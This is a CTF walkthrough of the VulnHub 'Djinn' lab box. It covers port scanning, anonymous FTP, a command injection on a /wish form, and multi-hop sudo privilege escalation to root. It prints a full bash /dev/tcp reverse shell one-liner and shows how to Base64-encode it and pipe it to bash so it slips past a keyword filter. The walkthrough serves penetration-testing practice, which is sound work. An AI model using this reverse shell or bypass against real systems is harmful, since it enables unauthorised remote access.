---
title: "VulnHub: Djinn"
platform: "VulnHub"
difficulty: "Medium"
os: "Linux"
excerpt: "Command injection filter bypass with Base64 encoding, then a multi-hop privesc chain through a custom SUID binary."
---

Djinn is a creative multi-stage VulnHub box. The standout moments are a command
injection filter bypass using Base64 encoding, and a quirky multi-user privilege
escalation path that runs through a custom binary. A good one for practicing lateral
thinking when your usual payloads get blocked.

**Skills covered:**
- Network discovery with `netdiscover`
- Port & service enumeration with `nmap`
- FTP anonymous login & file enumeration
- Web directory brute-forcing with `gobuster`
- Command injection via a web input field
- Filter bypass using a Base64-encoded reverse shell
- Lateral movement via exposed credentials
- Multi-hop privesc: `www-data` → `nitish` → `sam` → `root`
- Exploiting a custom SUID binary via `sudo`

## Network Discovery

```
netdiscover -i eth0
```

Target resolved to `192.168.1.7`.

## Port Scanning

```
nmap -sV -sC 192.168.1.7
```

| Port | Service | Notes |
|------|---------|-------|
| 21/tcp | FTP | vsftpd 3.0.3, anonymous login allowed |
| 22/tcp | SSH | filtered |
| 1337/tcp | custom | "answer 1000 maths questions" challenge — likely a rabbit hole |
| 7331/tcp | HTTP | Werkzeug 0.16.0 (Python 2.7.15+), non-standard port |

## FTP Anonymous Access

Anonymous login was open with three readable files sitting in the root directory:

```
ftp 192.168.1.7
# Username: anonymous, Password: blank
get creds.txt
get game.txt
get message.txt
```

These gave early hints about system users and credentials — worth grabbing before
digging into the web service.

## Web Enumeration

`http://192.168.1.7:7331` showed a minimal page with no useful source. Brute-forced
directories with `gobuster`:

```
gobuster dir -u http://192.168.1.7:7331/ -w /usr/share/wordlists/dirb/big.txt
```

Found `/genie` (403 Forbidden) and `/wish`, which turned out to be the interesting
one.

## Command Injection via /wish

`/wish` presented a simple "make a wish" form that executes whatever's submitted.
Testing basic OS commands confirmed the output was reflected back through `/genie`
as a URL-encoded string — command execution confirmed.

A direct reverse shell payload got rejected with a filter message, meaning certain
characters and keywords were blacklisted.

## Filter Bypass with Base64

Special characters like `>`, `&`, `/` and some keywords were blocked, but `echo`,
`base64 -d`, and `bash` all passed through. The workaround: Base64-encode the whole
reverse shell command and decode it at execution time.

Encoded the payload locally:

```
echo 'bash -i >& /dev/tcp/192.168.1.6/4444 0>&1' | base64
```

Started a listener:

```
nc -nvlp 4444
```

Submitted the encoded command through `/wish`:

```
echo '<base64 string>' | base64 -d | bash
```

Got a connect-back as `www-data`, then upgraded to a proper TTY with the usual
`pty.spawn` trick.

## Lateral Movement: www-data → nitish

Two user home directories existed: `nitish` and `sam`. Direct access to `nitish`'s
`user.txt` was denied, but a hidden `.dev` directory held a readable credentials
file, which handed over a working password for `nitish` via `su`.

## Lateral Movement: nitish → sam

```
sudo -l
```

`nitish` could run a binary called `genie` as `sam`, no password required. Passing
it a command flag dropped straight into a shell running as `sam`.

## Privilege Escalation: sam → root

```
sudo -l
```

`sam` had passwordless sudo on a custom binary at `/root/lago`. Running it presented
an interactive menu (guess-the-number, read files, etc). Choosing the "guess the
number" option and then entering a non-numeric string instead of a number crashed
the program straight into a root shell — a classic unhandled-input bug turned into a
privesc primitive.

## Capturing the Flag

`/root/proof.sh` printed the completion banner and flag, confirming root.

## Attack Chain Summary

```
netdiscover → nmap (FTP anon + HTTP on :7331)
  → FTP creds → gobuster (/wish command injection)
  → filtered payload → Base64-encoded reverse shell → www-data
  → nitish creds (.dev/creds.txt) → su nitish
  → sudo -u sam genie -cmd → sam shell
  → sudo -u root /root/lago → bad input → root shell
```

## Key Takeaways

1. Scan all ports, not just the common ones — both the web service (7331) and the
   decoy challenge (1337) were on non-standard ports a default scan could easily miss.
2. Anonymous FTP is worth checking early — the credentials found there enabled
   lateral movement much later in the chain.
3. Command injection filters are rarely airtight — when direct payloads get
   blocked, encoding tricks like Base64 are a reliable way around keyword/character
   blacklists.
4. Run `sudo -l` at every privilege level — each user in this chain had a distinct
   sudo permission that formed the next hop.
5. Custom binaries with unexpected or unvalidated input are a real-world
   anti-pattern, not just a CTF trope — `/root/lago` crashing to a shell on bad
   input is exactly the kind of bug that shows up in production code too.

## Tools Used

`netdiscover`, `nmap`, `gobuster`, `ftp`, Pentestmonkey reverse shell one-liners,
`base64`, `netcat`.
